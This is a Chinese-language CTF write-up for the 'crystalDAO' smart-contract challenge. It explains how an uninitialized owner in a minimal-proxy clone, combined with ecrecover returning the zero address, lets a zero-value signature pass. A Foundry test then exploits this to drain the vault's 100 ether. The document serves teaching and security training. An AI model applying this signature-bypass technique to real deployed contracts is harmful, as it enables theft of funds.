## crystalDAO
不是这题真有点sb，我看了半天没找到问题在哪，最后看见一个题解的注释恍然大悟，进行克隆部署最小代理合约，最小代理合约调用实现合约是delegatecall的，即使之前owner被初始化了，但是owner只在实现合约上下文有效，最小合约调用时owner是最小代理合约对应位置的参数，最小代理合约本身储存槽里没有任何参数，只能通过initialize初始化，再次进行初始化的时候owner没有被初始化，因为在构造函数里已经被禁止了，所以owner是0地址，erecover报错也会返回0地址，就过了。

## 解题
```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DaoVaultImplementation, FactoryDao, IDaoVault} from "../src/7_crystalDAO/crystalDAO.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/




/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge7Test is Test {
    FactoryDao factory;

    address public whitehat = makeAddr("whitehat");
    address public daoManager;
    uint256 daoManagerKey;

    IDaoVault vault;

    function setUp() public {
        (daoManager, daoManagerKey) = makeAddrAndKey("daoManager");
        factory = new FactoryDao();

        vm.prank(daoManager);
        vault = IDaoVault(factory.newWallet());

        // The vault has reached 100 ether in donations
        deal(address(vault), 100 ether);
    }


    function testHack() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge7Test -vvvv //
        ////////////////////////////////////////////////////*/
        address target = address(daoManager);

        vault.execWithSignature(0, 0, 0, target, 100 ether, bytes(""), 100);



        //==================================================//
        vm.stopPrank();

        assertEq(daoManager.balance, 100 ether, "The Dao manager's balance should be 100 ether");
    }
}

```
